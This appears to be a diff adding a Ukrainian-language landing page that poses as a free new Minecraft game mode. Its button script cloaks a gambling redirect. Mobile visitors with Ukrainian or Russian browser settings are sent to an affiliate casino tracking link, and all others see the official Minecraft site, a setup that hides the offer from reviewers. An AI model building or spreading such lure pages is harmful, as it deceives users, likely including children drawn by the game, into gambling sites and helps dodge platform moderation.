@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Minecraft Спільнота</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            /* Зробили фон темним матовим, щоб закрити порожнечі, якщо екран завеликий */
+            background-color: #1a1a1a; 
+            /* Змінили на 'contain', щоб картинка повністю поміщалася на екрані і не обрізалася */
+            background: url('bg.png') no-repeat center center fixed;
+            background-size: contain;
+            color: white;
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        /* Зсунули плашку трохи вниз і адаптували під мобільні */
+        .container {
+            padding: 30px 20px;
+            width: 90%;
+            max-width: 360px;
+            background: rgba(20, 20, 20, 0.9); /* Зробили плашку трохи темнішою для контрасту */
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.9);
+            box-sizing: border-box;
+            /* Зсуваємо плашку вгору на моніторах, щоб відкрити напис MINE під нею */
+            margin-top: -120px; 
+        }
+        .btn {
+            background: #5c8e32;
+            color: white;
+            border: none;
+            padding: 16px 40px;
+            font-size: 20px;
+            font-weight: bold;
+            border-bottom: 4px solid #3b5c20;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 25px;
+            text-transform: uppercase;
+            width: 100%;
+            box-sizing: border-box;
+            transition: background 0.2s;
+        }
+        .btn:active {
+            background: #4a7328;
+            border-bottom: 2px solid #2d4719;
+            transform: translateY(2px);
+        }
+        h1 {
+            color: #ffffff; 
+            font-size: 24px; 
+            margin: 0 0 15px 0;
+        }
+        p {
+            font-size: 16px;
+            line-height: 1.4;
+            color: #e0e0e0;
+            margin: 15px 0;
+        }
+
+        /* Окреме налаштування суто для телефонів, щоб на мобільці все сідало як рідне */
+        @media (max-width: 600px) {
+            body {
+                background-size: cover; /* На смартфонах вертикальна картинка заповнить весь екран */
+            }
+            .container {
+                margin-top: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Новий режим Minecraft 2026</h1>
+        <p>Зіграй та отримай свої спроби на старті гри!</p>
+        
+        <button class="btn" id="startBtn">Грати безкоштовно</button>
+    </div>
+
+    <script>
+        document.getElementById('startBtn').addEventListener('click', function() {
+            // Встав своє посилання на казино сюди
+            var realOffer = "https://click.mytraffgun.com/click?pid=493&offer_id=443"; 
+            
+            var whitePage = "https://www.minecraft.net/"; 
+
+            var isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            var userLang = navigator.language.toLowerCase();
+            var isTargetLang = userLang.includes('uk') || userLang.includes('ru');
+
+            if (isMobile && isTargetLang) {
+                window.location.href = realOffer;
+            } else {
+                window.location.href = whitePage;
+            }
+        });
+    </script>
+</body>
+</html>
